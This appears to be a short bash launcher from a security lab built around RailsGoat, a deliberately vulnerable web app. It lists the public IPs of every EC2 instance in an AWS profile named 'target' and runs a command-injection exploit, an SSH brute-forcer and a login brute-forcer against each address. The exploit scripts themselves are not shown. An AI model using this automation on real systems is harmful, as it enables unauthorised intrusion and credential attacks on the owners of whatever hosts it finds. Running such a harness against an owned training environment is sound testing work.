#!/bin/bash

IP_ADDRESSES=`aws ec2 describe-instances --profile target | jq -r '.Reservations[] | .Instances[] | .PublicIpAddress' | grep -v null`

ruby -W0 railsgoat_cmd_injection.rb $IP_ADDRESSES
./bruteforce_ssh_public_IP.rb $IP_ADDRESSES
./bruteforce_railsgoat_login_public_IP.rb $IP_ADDRESSES
